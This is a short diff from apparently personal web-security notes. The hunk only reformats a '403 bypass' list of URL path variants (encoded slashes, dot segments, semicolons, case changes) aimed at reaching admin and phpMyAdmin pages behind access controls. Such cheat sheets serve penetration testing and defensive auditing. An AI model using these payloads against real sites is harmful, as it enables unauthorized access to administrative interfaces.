@@ -4441,21 +4441,21 @@ state[i] = state[i-3] + state[i-31]`
 ----
 
 bypass 403  
-d.org/admin/*
-d.org/*admin/
-d.org/%2fadmin/
-d.org%2fadmin%2f
-d.org/./admin/
-d.org//admin/./
-d.org///admin///
-d.org//admin//
-d.org/ADMIN/
-d.org/;/admin/
-d.org//;//admin/
-/phpmyadmin/*
-/./phpmyadmin/
-//phpmyadmin//
-/*/phpmyadmin/
+d.org/admin/*  
+d.org/*admin/  
+d.org/%2fadmin/  
+d.org%2fadmin%2f  
+d.org/./admin/  
+d.org//admin/./  
+d.org///admin///  
+d.org//admin//  
+d.org/ADMIN/  
+d.org/;/admin/  
+d.org//;//admin/  
+/phpmyadmin/*  
+/./phpmyadmin/  
+//phpmyadmin//  
+/*/phpmyadmin/  
 
 # 高级PHP应用程序漏洞审核技术 #
 
